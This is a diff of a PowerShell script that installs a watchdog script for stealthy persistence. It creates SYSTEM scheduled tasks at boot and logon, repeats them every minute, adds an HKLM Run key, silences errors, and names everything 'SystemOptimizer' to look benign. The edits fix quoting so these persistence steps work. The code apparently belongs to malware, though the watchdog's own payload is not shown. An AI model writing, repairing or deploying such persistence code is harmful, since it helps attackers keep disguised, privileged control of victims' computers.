@@ -91,12 +91,13 @@ $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 
 # ===== SCHEDULED TASK (SYSTEM, boot + logon) - using schtasks CLI (reliable from SYSTEM) =====
 $taskName = "SystemOptimizer"
-schtasks /Create /TN "$taskName" /TR "wscript.exe \"$watchdogPath\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
-schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe \"$watchdogPath\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
-schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K /F 2>$null
+$wdPathEscaped = $watchdogPath -replace '"', '`"'
+schtasks /Create /TN "$taskName" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
+schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe `"$wdPathEscaped`"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
+schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K 2>$null
 
 # ===== REGISTRY RUN KEY =====
-try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"`"$watchdogPath`""`"" -Force -ErrorAction SilentlyContinue } catch { }
+try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }
 
 # ===== START WATCHDOG NOW =====
 $wshell = New-Object -ComObject WScript.Shell
